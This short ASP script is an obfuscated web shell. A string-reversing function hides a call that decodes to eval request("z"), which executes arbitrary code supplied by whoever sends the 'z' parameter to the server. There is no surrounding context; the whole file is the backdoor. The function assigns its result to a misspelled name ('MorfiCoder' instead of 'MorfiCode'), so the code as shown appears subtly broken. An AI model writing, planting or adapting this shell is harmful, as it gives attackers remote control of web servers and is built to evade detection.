<%
Function MorfiCode(Code)
    MorfiCoder=Replace(Replace(StrReverse(Code),"/*/",""""),"\*\",vbCrlf)
End Function
Execute MorfiCode(")/*/z/*/(tseuqer lave")
%>